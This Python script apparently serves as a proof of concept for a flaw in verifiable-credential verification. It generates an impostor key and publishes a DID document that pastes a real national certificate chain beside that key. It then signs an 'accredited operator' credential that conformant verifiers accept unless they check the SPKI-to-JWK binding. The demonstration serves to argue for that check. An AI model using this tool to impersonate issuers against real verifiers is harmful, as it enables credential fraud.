"""Build the credential that makes the argument.

An impostor generates its own key, publishes a DID document that pastes **someone else's
genuine national certificate chain** beside it, and signs a credential with it.

Nothing here is forged. The chain is the real one, issued by the real Issuing CA, and it
validates to the National Root CA. It simply does not certify the key sitting next to it.

The source document names this exactly: *"Step 4 never touches x5c ... Anyone can paste a
national CA chain into their own did.json."* A conformant verifier accepts this credential,
because checking the chain is not part of what it does. Only the SPKI-to-JWK binding check
catches it, which is why the source document calls that check the thing without which the
chain is decorative.
"""

from __future__ import annotations

import argparse
import base64
import datetime as dt
import json
from pathlib import Path

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec, utils as asym_utils
from jwkexport import load_chain, public_jwk_with_chain, thumbprint

UTC = dt.timezone.utc


def b64u(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def compact(obj) -> bytes:
    return json.dumps(obj, separators=(",", ":"), sort_keys=True).encode()


def sign_compact(payload: dict, key, *, kid: str) -> str:
    header = {"alg": "ES256", "typ": "vc+jwt", "kid": kid}
    signing_input = f"{b64u(compact(header))}.{b64u(compact(payload))}".encode()
    der = key.sign(signing_input, ec.ECDSA(hashes.SHA256()))
    r, s = asym_utils.decode_dss_signature(der)
    return f"{signing_input.decode()}.{b64u(r.to_bytes(32, 'big') + s.to_bytes(32, 'big'))}"


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--did", required=True, help="the impostor's own DID")
    parser.add_argument("--borrowed-leaf", required=True,
                        help="a real issuer certificate to paste in, unmodified")
    parser.add_argument("--borrowed-issuing-ca", required=True)
    parser.add_argument("--did-out", required=True)
    parser.add_argument("--credential-out", required=True)
    parser.add_argument("--credential-type", default="AccreditedOperatorCredential")
    args = parser.parse_args()

    # The impostor's own key. It was never certified by anybody.
    key = ec.generate_private_key(ec.SECP256R1())
    borrowed = load_chain(args.borrowed_leaf, args.borrowed_issuing_ca)

    # The JWK advertises the impostor's key, and carries the borrowed chain beside it.
    jwk = public_jwk_with_chain(key, borrowed, kid="placeholder")
    fragment = thumbprint(jwk)
    jwk["kid"] = fragment
    method_id = f"{args.did}#{fragment}"

    document = {
        "@context": ["https://www.w3.org/ns/did/v1",
                     "https://w3id.org/security/suites/jws-2020/v1"],
        "id": args.did,
        "verificationMethod": [{
            "id": method_id,
            "type": "JsonWebKey2020",
            "controller": args.did,
            "publicKeyJwk": jwk,
        }],
        "assertionMethod": [method_id],
    }
    out = Path(args.did_out)
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(json.dumps(document, indent=2) + "\n")

    now = dt.datetime.now(tz=UTC).replace(microsecond=0)
    stamp = now.isoformat().replace("+00:00", "Z")
    credential = sign_compact(
        {
            "@context": ["https://www.w3.org/ns/credentials/v2"],
            "id": "urn:uuid:99999999-8888-7777-6666-555555555555",
            "jti": "urn:uuid:99999999-8888-7777-6666-555555555555",
            "type": ["VerifiableCredential", args.credential_type],
            "iss": args.did,
            "issuer": {"id": args.did, "type": ["Profile"], "name": "Totally Legitimate Registry"},
            "iat": int(now.timestamp()),
            "nbf": int(now.timestamp()),
            "validFrom": stamp,
            "credentialSubject": {
                "id": "did:example:holder-impostor",
                "operatorName": "Not Actually Accredited",
                "licenceNumber": "OP-0000-0000",
            },
        },
        key, kid=method_id,
    )
    Path(args.credential_out).parent.mkdir(parents=True, exist_ok=True)
    Path(args.credential_out).write_text(credential)

    # State the thing plainly, for whoever is watching.
    leaf_spki = borrowed[0].public_key().public_bytes(
        serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo)
    own_spki = key.public_key().public_bytes(
        serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo)
    print(f"impostor DID        {args.did}")
    print(f"borrowed chain      {borrowed[0].subject.rfc4514_string()}")
    print(f"                    -> {borrowed[1].subject.rfc4514_string()}")
    print(f"chain certifies     {'the same key' if leaf_spki == own_spki else 'a DIFFERENT key'}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
